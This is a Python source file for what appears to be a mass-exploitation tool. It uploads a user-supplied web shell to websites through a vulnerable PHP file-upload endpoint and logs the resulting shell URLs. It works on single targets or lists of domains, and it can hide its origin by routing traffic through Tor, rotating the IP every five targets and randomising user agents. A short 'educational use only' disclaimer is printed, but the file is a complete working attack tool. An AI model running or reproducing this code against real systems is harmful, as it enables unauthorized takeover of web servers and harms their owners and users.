import requests
import subprocess
import argparse
import sys
from misc import redundant
from misc import colors

"""Author: Joshua Whitaker"""
"""Twitter: @_Stahlz"""
"""Email: stahl@stahl.io"""

"""Initalizing Classes"""
global initall
initall = redundant()
global colors
initcolor = colors()

"""Misc Vars"""
global write_output
write_output = False
global set_tor_reset_interval
set_tor_reset_interval = 5
global tor_count
tor_count = 0

art = (
initcolor.OKGREEN + ' ▄▄▄██▀▀▀█████    ██████  ██░ ██ ▓█████  ██▓     ██▓    ' + initcolor.ENDC + '\n' +
initcolor.OKGREEN + '   ▒██ ▒██▓  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    ' + initcolor.ENDC + '\n' +
initcolor.OKGREEN + '   ░██ ▒██▒  ██░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    ' + initcolor.ENDC + '\n' +
initcolor.OKGREEN + '▓██▄██▓░██  █▀ ░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    ' + initcolor.ENDC + '\n' +
initcolor.OKGREEN + ' ▓███▒ ░▒███▒█▄ ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒' + initcolor.ENDC + '\n' +
initcolor.OKGREEN + ' ▒▓▒▒░ ░░ ▒▒░ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░' + initcolor.ENDC + '\n' +
initcolor.OKGREEN + ' ▒ ░▒░  ░ ▒░  ░ ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░' + initcolor.ENDC + '\n' +
initcolor.OKGREEN + ' ░ ░ ░    ░   ░ ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   ' + initcolor.ENDC + '\n' +
initcolor.OKGREEN + ' ░   ░     ░          ░   ░  ░  ░   ░  ░    ░  ░    ░  ░' + initcolor.ENDC + '\n')
print(art)

print(initcolor.WARNING + 'Using this agianst servers you dont control, is illegal in most countries.' + initcolor.ENDC) 
print(initcolor.WARNING + 'The author claims no responsibility for the actions of those who use this software for illegal purposes.' + initcolor.ENDC)
print(initcolor.WARNING + 'This software is intended for educational use only.'  + initcolor.ENDC)


"""Argparse block"""
parser = argparse.ArgumentParser()
parser.add_argument('-l','--list', dest='list_init', required=False, help='Select for a list of assets to exploit')
parser.add_argument('-t','--target', dest='single_target',required=False, help='Single exploit target')
parser.add_argument('-s','--shell', dest='shell_loc', required=True, help='This is required, put the fullpath to your shell')
parser.add_argument('-o','--output', dest='outputz', required=False, help='This is full path to were you want to save your list of confirmed hosts')
parser.add_argument('-tor','--tor_proxy', action='store_true', dest='torproxy', help='Select if you have tor installed, you will need to enable control port', required=False, default=False)
args = parser.parse_args()

"""If Block for exiting if requirements aern't meant"""
if (args.list_init == None) and (args.single_target == None):
  print(initcolor.FAIL + '[-] Please select a list -l or -t for single target' + initcolor.ENDC)
  sys.exit()

if (args.list_init != None) and (args.single_target != None):
  print(initcolor.FAIL + '[-] Please select either a list or single target, not both' + initcolor.ENDC)
  sys.exit()

if (args.list_init != None) and (args.single_target == None):
  with open(args.list_init,'r') as lists:
    output = lists.read().splitlines()

if args.shell_loc == None or '':
  print(initcolor.FAIL + '[-] Please put the full path to your shell' + initcolor.ENDC)
  sys.exit()

if args.outputz == None or '':
  pass
else:
  write_output = True

if args.torproxy == True:
  tor_ps = initall.is_tor_running()
  if tor_ps != '' or None:
    print(initcolor.OKGREEN + '[*] Tor Proxy Enabled, PID {0}'.format(tor_ps) + initcolor.ENDC)
    global proxies
    proxies = {
              'http': 'socks5://127.0.0.1:9050',
              'https': 'socks5://127.0.0.1:9050'
              }
    """Every time the script is run a new ip is requested through the tor control port"""
    initall.reset_tor_ip()
    print(initcolor.OKGREEN + '[*] Reseting Tor Connection' + initcolor.ENDC)
  else:
    print(initcolor.FAIL + '[-] Could not find Tor Running, Please Start the Tor Service and re-run' + initcolor.ENDC)
    sys.exit()


"""Session for building concurrency"""
global request
request = requests.Session()

"""Get Shell Name"""
global shell_name
shell_name = initall.shell_name(args.shell_loc)

"""Shell upload to Server"""
global files
files = {'files':('{0}'.format(shell_name), open(args.shell_loc, 'rb'), 'multipart/form-data')}

def http(domain):
  if args.torproxy == True:
    upload_shell = request.post('{0}/server/php/index.php'.format(domain), files=files, proxies=proxies, headers=initall.random_agent())
    shell_location = '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
    if upload_shell.status_code == 200:
      print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
      if write_output == True:
        initall.write_me(args.outputz,shell_location)
    elif upload_shell.status_code != 200:
      print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)
  elif args.torproxy == False:
    upload_shell = request.post('{0}/server/php/index.php'.format(domain), files=files, headers=initall.random_agent())
    shell_location = '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
    if upload_shell.status_code == 200:
      print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
      if write_output == True:
        initall.write_me(args.outputz,shell_location)
    elif upload_shell.status_code != 200:
      print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)

def https(domain):
  if args.torproxy == True:
    upload_shell = request.post('{0}/server/php/index.php'.format(domain), files=files, proxies=proxies, headers=initall.random_agent())
    shell_location = '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
    if upload_shell.status_code == 200:
      print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
      if write_output == True:
        initall.write_me(args.outputz,shell_location)
    elif upload_shell.status_code != 200:
      print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)
  elif args.torproxy == False:
    upload_shell = request.post('{0}/server/php/index.php'.format(domain), files=files, headers=initall.random_agent())
    shell_location = '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
    if upload_shell.status_code == 200:
      print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
      if write_output == True:
        initall.write_me(args.outputz,shell_location)
    elif upload_shell.status_code != 200:
      print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)

"""Target Logic"""
if args.single_target != None:
  if 'http://' in args.single_target:
    http(args.single_target)
  elif 'https://' in args.single_target:
    https(args.single_target)
  else:
    domain = 'http://{0}'.format(args.single_target)
    http(domain)
elif args.list_init != None:
  for domain in output:
    if tor_count >= set_tor_reset_interval:
      print(initcolor.OKGREEN + '[*] Reseting Tor Connection' + initcolor.ENDC)
      initall.reset_tor_ip()
      tor_count = 0
    if 'http://' in domain:
      if args.torproxy == True:
        tor_count += 1
      http(domain)
    elif 'https://' in domain:
      if args.torproxy == True:
        tor_count += 1
      https(domain)
    else:
      if args.torproxy == True:
        tor_count += 1
      domain = 'http://{0}'.format(domain)
      http(domain)
